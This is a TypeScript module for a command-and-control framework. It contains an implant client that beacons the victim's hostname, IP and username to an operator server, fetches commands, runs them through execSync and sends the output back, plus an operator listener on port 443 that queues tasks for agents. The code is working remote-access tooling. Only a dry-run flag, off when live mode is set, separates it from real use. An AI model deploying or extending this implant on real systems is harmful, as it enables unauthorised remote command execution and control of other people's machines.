/**
 * @module c2
 * C2 (Command & Control) — operator console, agent client, and proxy rotation.
 * Provides the core framework for managing implant sessions with real network transport.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as net from "node:net";
import * as crypto from "node:crypto";
import * as https from "node:https";
import * as http from "node:http";
import { EventEmitter } from "node:events";

// ─── Types ────────────────────────────────────────────────────────────────────

export type AgentStatus = "active" | "idle" | "lost" | "dead";
export type Platform = "windows" | "linux" | "darwin" | "android" | "ios";

export interface Agent {
  id: string;
  hostname: string;
  username: string;
  platform: Platform;
  arch: string;
  pid: number;
  ip: string;
  checkinAt: Date;
  status: AgentStatus;
  tags: string[];
}

export interface TaskResult {
  taskId: string;
  agentId: string;
  output: string;
  exitCode: number;
  completedAt: Date;
}

export interface Task {
  id: string;
  agentId: string;
  command: string;
  createdAt: Date;
  timeout: number;
}

export interface ProxyConfig {
  host: string;
  port: number;
  type: "http" | "socks5";
  auth?: { username: string; password: string };
}

export interface C2Options {
  live?: boolean;
  listenHost?: string;
  listenPort?: number;
  encryptionKey?: string;
}

// ─── Proxy Rotation ───────────────────────────────────────────────────────────

export class ProxyRotator {
  private proxies: ProxyConfig[];
  private index = 0;

  constructor(proxies: ProxyConfig[]) {
    this.proxies = proxies;
  }

  next(): ProxyConfig {
    const proxy = this.proxies[this.index];
    this.index = (this.index + 1) % this.proxies.length;
    return proxy;
  }

  random(): ProxyConfig {
    return this.proxies[Math.floor(Math.random() * this.proxies.length)];
  }

  add(proxy: ProxyConfig): void {
    this.proxies.push(proxy);
  }

  remove(host: string): void {
    this.proxies = this.proxies.filter((p) => p.host !== host);
  }

  get count(): number { return this.proxies.length; }
}

// ─── Agent Client ─────────────────────────────────────────────────────────────

export class AgentClient extends EventEmitter {
  private agentId: string;
  private beaconInterval: number;
  private c2Url: string;
  private running = false;
  private timer?: ReturnType<typeof setInterval>;
  private encKey: Buffer;
  private proxy?: ProxyRotator;
  private live: boolean;

  constructor(opts: {
    c2Url: string;
    beaconIntervalMs?: number;
    encryptionKey?: string;
    proxy?: ProxyRotator;
    live?: boolean;
  }) {
    super();
    this.agentId = crypto.randomUUID();
    this.c2Url = opts.c2Url;
    this.beaconInterval = opts.beaconIntervalMs ?? 5000;
    this.encKey = crypto.scryptSync(opts.encryptionKey ?? "default", "salt", 32);
    this.proxy = opts.proxy;
    this.live = opts.live ?? false;
  }

  encrypt(data: string): string {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv("aes-256-gcm", this.encKey, iv);
    const enc = Buffer.concat([cipher.update(data, "utf8"), cipher.final()]);
    const tag = cipher.getAuthTag();
    return Buffer.concat([iv, tag, enc]).toString("base64");
  }

  decrypt(b64: string): string {
    const buf = Buffer.from(b64, "base64");
    const iv = buf.subarray(0, 16);
    const tag = buf.subarray(16, 32);
    const enc = buf.subarray(32);
    const decipher = crypto.createDecipheriv("aes-256-gcm", this.encKey, iv);
    decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(enc), decipher.final()]).toString("utf8");
  }

  start(): void {
    if (this.running) return;
    this.running = true;
    this.timer = setInterval(() => void this._beacon(), this.beaconInterval);
    this.emit("started", { agentId: this.agentId });
  }

  stop(): void {
    if (this.timer) clearInterval(this.timer);
    this.running = false;
    this.emit("stopped");
  }

  private async _beacon(): Promise<void> {
    const hostname = this.live ? (await this.getHostname()) : "DRY-RUN";
    const ip = this.live ? (await this.getIP()) : "127.0.0.1";
    const username = this.live ? (await this.getUsername()) : "simulated";

    const payload = {
      id: this.agentId,
      hostname,
      ip,
      username,
      platform: process.platform as Platform,
      arch: process.arch,
      pid: process.pid,
      ts: Date.now(),
    };

    const encrypted = this.encrypt(JSON.stringify(payload));

    if (!this.live) {
      this.emit("beacon", { agentId: this.agentId, body: encrypted });
      const fakeTask: Task = {
        id: crypto.randomUUID(),
        agentId: this.agentId,
        command: "whoami",
        createdAt: new Date(),
        timeout: 30,
      };
      this.emit("task", fakeTask);
      return;
    }

    // Live mode: actual HTTP beacon
    try {
      const url = new URL(this.c2Url);
      const body = JSON.stringify({ beacon: encrypted });
      const options: http.RequestOptions = {
        hostname: url.hostname,
        port: url.port,
        path: url.pathname || "/beacon",
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": Buffer.byteLength(body),
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        timeout: 10000,
      };

      const proto = url.protocol === "https:" ? https : http;
      const response = await new Promise<{ status: number; body: string }>((resolve, reject) => {
        const req = proto.request(options, (res) => {
          let data = "";
          res.on("data", (chunk) => { data += chunk; });
          res.on("end", () => resolve({ status: res.statusCode ?? 0, body: data }));
        });
        req.on("error", reject);
        req.on("timeout", () => { req.destroy(); reject(new Error("beacon timeout")); });
        req.write(body);
        req.end();
      });

      this.emit("beacon:sent", { agentId: this.agentId, status: response.status });

      if (response.status === 200) {
        try {
          const data = JSON.parse(response.body);
          if (data.task) {
            const task: Task = {
              id: data.task.id || crypto.randomUUID(),
              agentId: this.agentId,
              command: data.task.command,
              createdAt: new Date(),
              timeout: data.task.timeout || 60,
            };
            this.emit("task", task);
          }
        } catch {}
      }
    } catch (err) {
      this.emit("beacon:failed", { agentId: this.agentId, error: String(err) });
    }
  }

  private async getHostname(): Promise<string> {
    try {
      const { execSync } = await import("node:child_process");
      return execSync("hostname", { encoding: "utf-8", timeout: 3000 }).trim();
    } catch { return "unknown"; }
  }

  private async getIP(): Promise<string> {
    try {
      const { execSync } = await import("node:child_process");
      const out = execSync("hostname -I 2>/dev/null || ip route get 1 2>/dev/null | awk '{print $7; exit}'", {
        encoding: "utf-8", timeout: 3000,
      });
      return out.trim().split(" ")[0] || "127.0.0.1";
    } catch { return "127.0.0.1"; }
  }

  private async getUsername(): Promise<string> {
    try {
      const { execSync } = await import("node:child_process");
      return execSync("whoami", { encoding: "utf-8", timeout: 3000 }).trim();
    } catch { return "unknown"; }
  }

  /** Execute a received task and report result back to C2. */
  async executeTask(task: Task): Promise<TaskResult> {
    const { execSync } = await import("node:child_process");
    let output = "";
    let exitCode = 0;

    try {
      output = execSync(task.command, {
        encoding: "utf-8",
        timeout: task.timeout * 1000,
        maxBuffer: 1024 * 1024,
      });
    } catch (err: any) {
      output = err.stdout || err.message || "execution failed";
      exitCode = err.status || 1;
    }

    const result: TaskResult = {
      taskId: task.id,
      agentId: this.agentId,
      output: output.slice(0, 10000),
      exitCode,
      completedAt: new Date(),
    };

    if (this.live) {
      await this.reportResult(result);
    }

    this.emit("result", result);
    return result;
  }

  private async reportResult(result: TaskResult): Promise<void> {
    try {
      const url = new URL(this.c2Url);
      const encrypted = this.encrypt(JSON.stringify(result));
      const body = JSON.stringify({ result: encrypted });
      const proto = url.protocol === "https:" ? https : http;

      await new Promise<void>((resolve, reject) => {
        const req = proto.request({
          hostname: url.hostname,
          port: url.port,
          path: url.pathname || "/result",
          method: "POST",
          headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) },
          timeout: 10000,
        }, (res) => {
          res.resume();
          resolve();
        });
        req.on("error", reject);
        req.on("timeout", () => { req.destroy(); reject(new Error("result timeout")); });
        req.write(body);
        req.end();
      });
    } catch {}
  }
}

// ─── Operator Console ─────────────────────────────────────────────────────────

export class Operator extends EventEmitter {
  private agents = new Map<string, Agent>();
  private taskQueue = new Map<string, Task[]>();
  private results: TaskResult[] = [];
  private opts: C2Options;
  private server?: http.Server;

  constructor(opts: C2Options = {}) {
    super();
    this.opts = opts;
  }

  /** Start the C2 listener (live mode). */
  startServer(): Promise<void> {
    return new Promise((resolve) => {
      const host = this.opts.listenHost ?? "0.0.0.0";
      const port = this.opts.listenPort ?? 443;

      this.server = http.createServer((req, res) => {
        let body = "";
        req.on("data", (chunk) => { body += chunk; });
        req.on("end", () => {
          try {
            const data = JSON.parse(body);
            if (data.beacon) this.handleBeacon(data.beacon, req, res);
            else if (data.result) this.handleResult(data.result, res);
            else { res.writeHead(400); res.end("bad request"); }
          } catch { res.writeHead(400); res.end("invalid json"); }
        });
      });

      this.server.listen(port, host, () => {
        this.emit("server:started", { host, port });
        resolve();
      });
    });
  }

  stopServer(): void {
    if (this.server) { this.server.close(); this.server = undefined; }
    this.emit("server:stopped");
  }

  private handleBeacon(encrypted: string, req: http.IncomingMessage, res: http.ServerResponse): void {
    try {
      const key = crypto.scryptSync(this.opts.encryptionKey ?? "default", "salt", 32);
      const buf = Buffer.from(encrypted, "base64");
      const iv = buf.subarray(0, 16);
      const tag = buf.subarray(16, 32);
      const enc = buf.subarray(32);
      const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
      decipher.setAuthTag(tag);
      const payload = JSON.parse(Buffer.concat([decipher.update(enc), decipher.final()]).toString("utf8"));

      const agent: Agent = {
        id: payload.id,
        hostname: payload.hostname,
        username: payload.username,
        platform: payload.platform,
        arch: payload.arch,
        pid: payload.pid,
        ip: payload.ip,
        checkinAt: new Date(),
        status: "active",
        tags: [],
      };

      this.agents.set(agent.id, agent);
      this.emit("agent:checkin", agent);

      const queue = this.taskQueue.get(agent.id) ?? [];
      if (queue.length > 0) {
        const task = queue.shift()!;
        this.taskQueue.set(agent.id, queue);
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ task: { id: task.id, command: task.command, timeout: task.timeout } }));
      } else {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({}));
      }
    } catch (err) {
      res.writeHead(500);
      res.end("decryption failed");
    }
  }

  private handleResult(encrypted: string, res: http.ServerResponse): void {
    try {
      const key = crypto.scryptSync(this.opts.encryptionKey ?? "default", "salt", 32);
      const buf = Buffer.from(encrypted, "base64");
      const iv = buf.subarray(0, 16);
      const tag = buf.subarray(16, 32);
      const enc = buf.subarray(32);
      const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
      decipher.setAuthTag(tag);
      const result: TaskResult = JSON.parse(Buffer.concat([decipher.update(enc), decipher.final()]).toString("utf8"));

      this.results.push(result);
      const agent = this.agents.get(result.agentId);
      if (agent) { agent.checkinAt = result.completedAt; agent.status = "active"; }
      this.emit("result", result);
      res.writeHead(200);
      res.end("ok");
    } catch {
      res.writeHead(500);
      res.end("decryption failed");
    }
  }

  registerAgent(info: Omit<Agent, "id" | "checkinAt" | "status">): Agent {
    const agent: Agent = {
      ...info,
      id: crypto.randomUUID(),
      checkinAt: new Date(),
      status: "active",
    };
    this.agents.set(agent.id, agent);
    this.emit("agent:registered", agent);
    return agent;
  }

  dispatchTask(agentId: string, command: string, timeoutSec = 60): Task {
    const task: Task = {
      id: crypto.randomUUID(),
      agentId,
      command,
      createdAt: new Date(),
      timeout: timeoutSec,
    };
    const queue = this.taskQueue.get(agentId) ?? [];
    queue.push(task);
    this.taskQueue.set(agentId, queue);
    this.emit("task:dispatched", task);
    return task;
  }

  dequeueTask(agentId: string): Task | undefined {
    const queue = this.taskQueue.get(agentId) ?? [];
    return queue.shift();
  }

  recordResult(result: TaskResult): void {
    this.results.push(result);
    const agent = this.agents.get(result.agentId);
    if (agent) { agent.checkinAt = result.completedAt; agent.status = "active"; }
    this.emit("result", result);
  }

  getAgents(): Agent[] {
    return [...this.agents.values()];
  }

  killAgent(agentId: string): void {
    const agent = this.agents.get(agentId);
    if (agent) { agent.status = "dead"; this.emit("agent:killed", agent); }
  }

  getResults(): TaskResult[] { return [...this.results]; }
}

export default { AgentClient, Operator, ProxyRotator };
